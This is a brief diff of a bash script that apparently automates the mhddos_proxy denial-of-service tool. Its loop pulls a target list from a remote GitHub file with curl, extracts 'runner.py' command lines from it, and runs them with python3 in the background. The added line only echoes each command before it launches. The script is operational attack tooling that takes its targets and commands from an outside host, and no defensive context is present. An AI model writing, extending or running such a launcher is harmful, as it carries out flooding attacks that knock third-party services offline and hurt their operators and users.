@@ -87,6 +87,7 @@ do
             cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets | cat | grep "^runner.py")")
            
             #echo $cmd_line
+            echo $cmd_line& $proxy_interval $threads $rpc
             python3 ~/mhddos_proxy/$cmd_line& $proxy_interval $threads $rpc
    done
 echo -e "#####################################\n"
